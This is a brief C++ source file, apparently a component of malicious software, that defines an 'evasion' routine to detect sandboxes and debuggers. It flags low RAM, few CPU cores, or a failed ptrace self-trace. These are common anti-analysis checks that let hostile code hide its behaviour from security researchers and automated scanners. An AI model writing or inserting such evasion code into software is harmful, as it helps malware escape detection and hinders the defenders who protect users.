#include "AntiSandbox.h"
#include <sys/sysinfo.h>
#include <unistd.h>
#include <sys/ptrace.h>

namespace evasion {

bool IsLikelySandbox() {
    struct sysinfo si;
    if (sysinfo(&si) == 0) {
        if (si.totalram * si.mem_unit < 4000000000ULL) return true;
    }
    if (sysconf(_SC_NPROCESSORS_ONLN) <= 2) return true;
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) return true;
    return false;
}

} // namespace evasion
